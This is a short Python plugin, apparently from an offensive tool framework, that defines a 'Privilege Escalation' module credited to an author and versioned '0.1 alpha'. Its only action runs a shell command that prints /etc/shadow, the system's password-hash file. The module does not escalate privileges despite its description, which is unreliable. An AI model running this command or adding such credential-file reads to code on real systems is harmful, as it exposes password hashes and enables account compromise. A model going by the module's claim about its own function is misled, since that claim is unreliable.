#!python3
import pty
import os
from plugins import PrivEsc
class PrivilegeEsc(PrivEsc):
	def __init__(self):
		PrivEsc.__init__(self)
		self.name="Privilege Escalation"
		self.author="Joe Conteh"
		self.description="Increases the privileges of the user, allows user to see contents of shadow file"
		self.version="0.1 alpha"
	
	def execute(self):
		os.system("cat /etc/shadow")